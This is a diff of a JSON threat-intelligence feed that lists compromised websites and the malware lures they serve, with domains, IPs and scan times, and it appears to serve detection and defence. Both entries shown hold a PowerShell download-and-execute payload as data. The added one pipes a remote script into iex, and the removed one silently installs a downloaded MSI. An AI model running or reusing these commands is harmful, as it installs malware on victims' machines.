@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "al-sorour.com.bd",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "161.118.245.37"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/621993c387443d46",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/621993c387443d46'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/621993c387443d46"
+    ],
+    "ReportId": "cmwnwrsgu1xi10omlj9jbvrk0",
+    "ScannedAt": "2026-11-19T18:53:30.900000+00:00"
+  },
+  {
     "UrlDomain": "mikinkaesamulis.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -9848,24 +9874,5 @@
     ],
     "ReportId": "cmwfo93tk0gqe0oml1kpi8kea",
     "ScannedAt": "2026-11-14T00:32:52.943000+00:00"
-  },
-  {
-    "UrlDomain": "mattsphotos.com.au",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "65.21.135.42"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwfcanbl0gd80omlgekvfmd3",
-    "ScannedAt": "2026-11-13T18:58:09.495000+00:00"
   }
 ]
